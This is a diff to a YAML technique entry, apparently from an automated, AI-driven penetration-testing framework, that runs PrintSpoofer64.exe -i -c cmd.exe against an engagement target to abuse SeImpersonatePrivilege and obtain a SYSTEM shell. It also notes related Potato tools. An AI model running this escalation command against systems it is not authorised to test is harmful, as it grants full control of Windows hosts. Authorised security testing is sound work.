@@ -6,14 +6,15 @@ preconditions:
 parameters:
   target_ip: from_engagement.target_ip
 command_template: PrintSpoofer64.exe -i -c cmd.exe
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- impersonate_used
+- system_shell
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: 'PrintSpoofer: simpler than JuicyPotato, works on all Windows versions.
-  GodPotato: works on .NET 4+. SweetPotato: combined approach. All exploit SeImpersonatePrivilege
-  → SYSTEM.'
+mechanism: "PrintSpoofer: simpler than JuicyPotato, works on all Windows versions.\
+  \ GodPotato: works on .NET 4+. SweetPotato: combined approach. All exploit SeImpersonatePrivilege\
+  \ \u2192 SYSTEM."
 hacktricks_ref: windows-hardening/windows-local-privilege-escalation/README.md
